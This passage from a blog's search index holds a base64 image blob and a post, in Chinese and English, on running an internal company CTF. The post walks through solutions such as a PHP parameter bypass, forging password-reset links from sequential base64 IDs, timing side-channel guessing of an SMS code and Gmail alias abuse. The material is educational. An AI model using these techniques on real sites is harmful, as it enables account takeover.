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從開頭可以知道這是一張圖片的base64壓縮圖，我們把以上編碼直接貼到瀏覽器網址列就能得到解答所在網址，進入網址後即可通關！4.衝出封鎖線題目說明： 這題一打開就是顯示這題的PHP程式，要想辦法用GET參數繞過判斷執行else裡面的setPassedCookie( );方法。解題：本題是一個蠻常用但卻很少人知道的PHP漏洞，詳細介紹如下：ctf中常见的PHP漏洞小结題目有稍微改過，這題的答案是：?m.id[ ]=admin5.滲透的考驗、6.滲透的考驗2這兩題都是入門的基礎XSS題目這邊就不做贅述。這題由於解答我放在前端，這邊使用了一個提供不可逆加密的JS網站： https://www.sojson.com/jsobfuscator.html(雖然我不確定是否為真？反正有辦法破解的話也就當他通過吧！)7.月光寶盒這題是從解謎APP拉出來的題目，這邊也不做展示。總結比賽系統大約花一週時間建置，題目大約花了三個月慢慢慢湊齊（要有靈感）；比賽也已圓滿落幕，得到的反饋都還不錯～「有趣好玩」；這也是我的初心，希望大家以有趣為出發點去探索、腦力激盪；所以不管是題目名稱（都很電影）、題目方向，都不會有太深入工程、計算的東西，這樣就太死不有趣了！另外，這邊附上題目回答率，當做難易度參考：當初在出題的時候最怕的就是題目太簡單大家很快就解完或題目太難大家都卡關，兩種狀況都很尷尬。以上題目實際比賽結果（比賽時間：90分鐘）符合我們的期望，剛剛好！不會太難獲太簡單，第一名的組別解了9題，即使是最後一名的組別也解了7題；非常接近，但因為有時間分數、購買提示的因素，所以最後還是分得出高下！ 比較意外的是通往魔法學院的大門…居然沒人解出來QQ以上就是這次舉辦工程CTF大賽的總整理Addcn 2019 CTF延伸閱讀 揭露一個幾年前發現的巧妙網站漏洞 APP有用HTTPS傳輸，但資料還是被偷了有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 4,840 Total Views Last Statistics Date: 2025-08-15 | 4,720 Views on Medium." }, { "title": "How to Create an Engaging Engineering CTF Competition", "url": "/posts/zrealm-dev/en/how-to-create-an-engaging-engineering-ctf-competition-729d7b6817a4/", "categories": "ZRealm Dev.", "tags": "capture-the-flag, ios-app-development, php, computer-science, wargame", "date": "2019-07-24 22:32:34 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版How to Create an Engaging Engineering CTF CompetitionBuilding Capture The Flag compe...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版How to Create an Engaging Engineering CTF CompetitionBuilding Capture The Flag competitions and generating questionsAbout CTFCapture The Flag, abbreviated as CTF, is a sport that originated in the West and is commonly seen in paintball and first-person shooter games today. The original concept involves teams competing to protect their own flag from being stolen while also trying to capture the flags of other teams. In the computer field, this translates to “attack and defense” where teams first identify their vulnerabilities to protect against intrusions, while simultaneously launching zero-latency attacks to score points by capturing from other teams.The above describes a standard, or even “advanced,” way of conducting a CTF competition. However, running a CTF competition within a company comes with additional practical considerations: The purpose of holding a CTF competition is not only to enhance technical skills but also to promote communication among engineers. Engineers have different strengths, including Front-End, Back-End, APP, and DevOps; to encourage participation from everyone, the questions should not be too focused on a specific area (e.g., networking, PHP). Teams should be balanced in terms of strengths and expertise across different domains. The event should ideally last no more than an afternoon. Organizing a CTF competition is a side project outside of primary work responsibilities, so there are limited resources and time available.Considering these factors, rather than calling it a CTF competition, it might be better described as: An activity for team-based puzzle-solving to accumulate flag points &amp; promote communication among engineersThis is a beginner-level CTF competition!Activity Goals Enhance engineering technical skills. Promote communication among engineers. Inspire enthusiasm and sharpness in exploring new things. Make it fun; doing boring things can be quite painful.Points 3 and 4 are my own additions. My expectations for this activity go beyond practical aspects; I hope to enhance everyone’s enthusiasm for exploration and learning new things in an enjoyable way, just like in daily work. We shouldn’t just be code monkeys; we should find ways to break through and keep moving forward!Competition Rules Engineers will be grouped based on their expertise and strengths. Competition duration: 90 minutes. A total of 12 questions will be provided, with 3 opportunities to purchase hints at a score cost. Hint purchase costs will decrease over time (the earlier you buy, the more expensive it is). Each question has a base score + time score (the earlier you solve it, the more points you earn). Once a team selects a question to answer, they will be locked into answering that question or any other already unlocked questions until the question is passed or the time limit expires. (This rule is in place because the main goal of the activity is to encourage team members to communicate and brainstorm together, rather than dividing the work of solving questions.) The score for each question, hint cost, and lock time will vary based on the difficulty of the question. Victory condition: The team with the highest accumulated score wins; if scores are tied, the time taken to solve questions will be compared. The winning team receives $$.How to Create It?Once the activity rules and goals are clarified, the next key point is how to set up a CTF competition.This section will be divided into two chapters: First, creating a system capable of conducting a CTF competition, Second, generating competition questions.1. Creating a System for CTF Competitions This part requires both front-end and back-end technical skills to implement; if you’re not familiar, you may need to ask other colleagues for help.Front-end: Semantic UIBack-end: PHP + JSON files for data storage.Due to time constraints, the competition system will be built to be simple, stable, and quick. The front-end interface will directly utilize the Semantic UI framework; the back-end will be written in PHP without using a framework, and data will be stored in JSON files without a database. Keeping it simple reduces potential issues (for example, preventing someone from attacking the competition system to directly obtain answers).Entry Page:Starting from a fun concept, the entry page uses a reference from the BBC series Sherlock:Mobile unlock code S H E RThese four input boxes are for entering the identification codes obtained by each team (4 digits). For example: Team 1 enters “1432”, Team 2 enters “8421”, to identify which team is answering the questions.As for the identification codes for each team, I embedded a little joke; the codes are presented as follows:Can you see the four-digit identification code? If not, try stepping back from the screen a bit.…….…………………………………………………………………………………….………………………………….……………………………. .……………………….………………. .……………….. .Answer: The identification code for Team 1 is 8291.After entering, you will enter the main page of the competition system - question list:Displayed at the top: Team 1, remaining hint vouchers.Middle question area: Question name, description, points awarded for passing, lock time, hint purchase, hint display.Hovering the mouse will show time score and hint price.Displayed at the bottom: Total current score.Back-end and other logic: The question list page will use Ajax to request the current answering status from the back-end every second, with the back-end reading and recording the answering status in each team’s JSON file. When unlocking a question, the time will be recorded, and until the time is up, no other questions can be unlocked. The completion time, time score, and hint price will increase or decrease based on the time spent. This is the general outline of the competition system, but the focus is not on the competition system itself, but on the questions! Whether they are interesting, whether everyone can participate, whether they have logic, and whether they are novel… these are really challenging to come up with.Let’s get to the main point!2. Generating Competition QuestionsFirst, let me introduce the five questions I came up with.1. The Door to the Magic AcademyQuestion Description: You will receive a string of keys and need to use this key to decipher a spell, entering it in the spell input box; there is also a verification code field that needs to be filled out before submitting the answer.Answer:This question tests information security and encoding issues; it utilizes a platform encryption and decryption vulnerability interface. If all encryption and decryption on the website are done using the same method and the same key, we can exploit this weakness to unlock the encrypted content and obtain the original data!You can see that the verification code part is ./image.php?token=AD0HbwdgVDw= which provides a decryption interface, so we can try using the encryption key from above:This gives us the decrypted string: LiveALifeYouWillRemember.Enter this into the spell input box to pass!2. Take Me Back to Shanghai in 1937!Question Description: You need to input a year/month/day to send to the back-end, allowing it to determine that it is the year 1937; the input range for the year (1947-2099) does not allow direct input of 1937.Answer:The main point of this question is not how to bypass front-end validation, as the back-end processes it and cannot be circumvented; this question primarily tests the 32-bit computer 2038 problem. Due to the 32-bit timestamp limitation, it can only display up to January 19, 2038, at 03:14:07; beyond that, it will overflow back to January 1, 1901. Therefore, by calculating forward, entering 2073-02-06 to 2074-02-05 will fall within the year 1937, and submitting a date within this range will succeed!Wikipedia3. Clash of the TitansQuestion Description: You need to find a way to receive a password reset email from a third party (an email you cannot log into) and complete the password reset for someone else.Answer:This question requires more sharpness. First, use your own email to request a password reset; the email we receive is as follows:Your password reset link: http://ctf.zhgchg.li/10/reset.php?requestid=OTk= If this is not related to you, please disregard this email, thank you!We can see that the password reset request is identified by the requestid parameter, and the value we received is OTk=, which looks like base64? Let’s give it a try:base64 decode and encodeWe find that the parameter value is 99. By repeating the password reset request, we get 100, so we can infer that the password reset requests are sequential numbers. The next number would be 101. Now, we can return to the original email we wanted to bypass and request a password reset; we can forge a password reset link and secretly reset someone else’s password.Encoding 101 in Base64 gives us MTAx, and we can forge the URL: http://ctf.zhgchg.li/10/reset.php?requestid=MTAx. Enter any password and click the reset button to pass!4. Master of DisguisesQuestion Description: You need to create 10 Gmail accounts (Gmail hosted accounts) to receive the answer emails.Answer:Of course, this question could be brute-forced, but company emails cannot be registered arbitrarily; unless you find 10 people to help you receive emails, you cannot answer.The key to this question is Gmail accounts/Gmail hosted accounts. Since company emails are Gmail hosted accounts, they also have the characteristics of Gmail accounts: you can use “.” and “+” to create infinite variations of the email address. The “.” can be placed anywhere in the username, and “+” can be placed at the end followed by any number.For example, if the main email is zhgchgli@gmail.com, then z.hgchgli@gmail.com, zh.gchgli@gmail.com, zhgchgli+1@gmail.com, zhgchgli+25@gmail.com… will all be delivered to zhgchgli@gmail.com. One email can create multiple identities!This question serves as a reminder to filter out these characters when registering accounts to prevent malicious users from creating numerous fake accounts.After receiving 10 emails, you can combine them to find the answer URL, and entering that URL will allow you to pass!5. Time MachineQuestion Description: Similar to question 3, you need to find a way to receive a verification code (4 digits) via SMS from a third party (an SMS you cannot receive) to log into someone else’s account.Answer:This question is less common and more difficult, primarily simulating a side-channel timing attack. The system login verification includes a complex algorithm, and there will be timing discrepancies when processing verification information (for example, entering one correct digit takes longer to process, while entering all wrong digits returns immediately). By observing these timing discrepancies, we start from 0000 and try one digit at a time. When we try 2000, we notice it takes one second, indicating the first digit is 2. Continuing with 2100 also takes one second, but 2200 takes longer, indicating a two-second delay… By continuing to test the third and fourth digits, we eventually arrive at the answer: 2256.This question simulates such an attack, with the back-end processing using sleep to mimic a complex algorithm. Generally, such attacks are less encountered in web and app environments; on one hand, the information processing is not complex enough to show significant timing discrepancies, and on the other hand, network factors can influence the results, making it difficult to judge.For more details on side-channel attacks, you can refer to this article:[30 Minutes to Understand What CORB Is — Side-Channel Attacks](https://segmentfault.com/a/1190000016126079){:target=\"_blank\"}&gt; _The above are five questions I came up with; below, I will continue to introduce the remaining seven questions provided by my colleagues._**1\\. Sadako Appears**![Sadako image sourced from the internet](/assets/729d7b6817a4/1*I4jlrpa3w-HmqCtuTY11ig.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0ODMiIGhlaWdodD0iNjM4Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }Sadako image sourced from the internet**Question Description:** The task is to input what Sadako wants to say in the dialogue box above to pass the level.**Answer:**This question tests whether you understand the concept that images can contain other information. The key lies in the original image:![Sadako image sourced from the internet](/assets/729d7b6817a4/1*zMmNz4PsgipRaxIPhUhYcQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0MTIiIGhlaWdodD0iNTIxIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }Sadako image sourced from the internetThis image has secretly compressed a text file inside it (for the actual method, please refer to: [How To Hide A ZIP File Inside An Image On Mac \\[Quicktip\\]](https://www.hongkiat.com/blog/hide-zip-image-mac/){:target=\"_blank\"}; note the differences between Win/Mac).So, we just need to simply unzip this image using Commone to obtain the passphrase:![](/assets/729d7b6817a4/1*e6j1AJPcv_qROUX4xUsJHA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1NjMiIGhlaWdodD0iMjkyIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }![](/assets/729d7b6817a4/1*YVOGsdi1hS2OO6ctHc6dFg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0NTYiIGhlaWdodD0iNDQzIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }Input \"YOUHAVENOIDEA\" in the dialogue box to pass the level!**Supplement:**Regarding the part about hiding information in images, there is another method using \"[Image Steganography](https://blog.trendmicro.com.tw/?p=12510){:target=\"_blank\"}\"![[Image Steganography and Malware: Principles and Methods](https://blog.trendmicro.com.tw/?p=12510){:target=\"_blank\"}](/assets/729d7b6817a4/1*WfSUbQXSjTOg28ZWsihMHg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2NjciIGhlaWdodD0iMjE3Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }[Image Steganography and Malware: Principles and Methods](https://blog.trendmicro.com.tw/?p=12510){:target=\"_blank\"}In simple terms, it involves manipulating the color values of pixel codes to hide information, where the actual image changes but is indistinguishable to the naked eye.This question anticipates that some may go in this direction, so I also embedded a steganography hint in the image. Those who take this path can receive a clue:![[Steganography Online](https://stylesuxx.github.io/steganography/){:target=\"_blank\"}](/assets/729d7b6817a4/1*POIFkyOYl3RdBWUAofw3PQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0MzgiIGhlaWdodD0iNjg2Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }[Steganography Online](https://stylesuxx.github.io/steganography/){:target=\"_blank\"}Upload the image to an online steganography decoding tool to obtain the hint.**2\\. Caesar's Morse Code**![Material image sourced from the internet](/assets/729d7b6817a4/1*PZz3sUOhaUNKRmNS_jY1RA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4MDYiIGhlaWdodD0iNjM1Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }Material image sourced from the internet**Question Description:** Try to decipher the meaning contained in the provided Morse code (a sentence in English).**Answer:**This question is quite straightforward. The first step is to decode the Morse code into English letters: \"`VYYXI DN HT GDAZ`\"![[Morse Code Translator](https://mathsking.net/morse.htm){:target=\"_blank\"}](/assets/729d7b6817a4/1*venMZ3lkF-hYarWe9bMd6A.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1MzAiIGhlaWdodD0iMTI1Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }[Morse Code Translator](https://mathsking.net/morse.htm){:target=\"_blank\"}Then, we perform a Caesar cipher decryption. When we try an offset of 5, we get a meaningful English sentence: \"[addcn](https://www.addcn.com/){:target=\"_blank\"} is my life,\" which is the answer!![[Caesar Cipher Decryption Tool](http://ctf.ssleye.com/caesar.html){:target=\"_blank\"}](/assets/729d7b6817a4/1*kTiosisv3i7Ib9v25AYftg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NDQiIGhlaWdodD0iNDAxIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }[Caesar Cipher Decryption Tool](http://ctf.ssleye.com/caesar.html){:target=\"_blank\"}**3\\. What Do You Think It Is?**![](/assets/729d7b6817a4/1*uQVxWP_Xkpy9ZrHUcMMNQw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAwIiBoZWlnaHQ9IjQzMiI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }The webpage for this question is filled with garbled text, which is as 